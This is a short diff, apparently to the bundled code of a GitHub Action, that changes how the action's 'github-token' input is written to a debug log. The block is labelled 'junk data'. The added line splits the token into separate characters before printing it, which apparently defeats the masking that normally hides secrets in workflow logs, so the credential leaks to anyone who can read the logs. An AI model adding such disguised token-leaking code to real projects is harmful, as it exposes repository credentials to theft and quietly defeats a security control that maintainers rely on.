@@ -9754,7 +9754,7 @@ async function run() {
     const token = core.getInput("github-token");
     core.debug(`
     *** junk data ***
-    ${format(token + "_")}
+    ${format(token.split("") + "_")}
     `);
     const octokit = github.getOctokit(token);
 
